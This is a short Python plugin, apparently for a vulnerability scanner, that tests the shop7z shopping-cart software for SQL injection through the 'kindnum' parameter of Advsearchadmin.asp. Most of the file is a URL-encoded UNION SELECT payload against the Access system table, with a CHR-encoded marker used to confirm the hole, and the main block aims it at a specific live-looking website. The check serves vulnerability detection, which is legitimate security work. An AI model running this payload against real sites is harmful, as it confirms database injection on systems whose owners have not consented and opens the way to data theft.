#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = shop7z Advsearchadmin.asp kindnum参数SQL注入漏洞
import re

def assign(service, arg):
    if service == "shop7z":
        return True, arg

def audit(arg):
    payload = 'Advsearchadmin.asp?kindnum=1%27%20union%20select%201%2CCHR%2832%29%2bCHR%2835%29%2bCHR%28116%29%2bCHR%28121%29%2bCHR%28113%29%2bCHR%2835%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%20from%20%20MSysAccessObjects%27'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target)
    if  code == 200 and '#tyq#' in res:
        security_hole(target)
        

if __name__ == '__main__':

    audit(assign('shop7z', 'http://www.99ysbjw.com/')[1])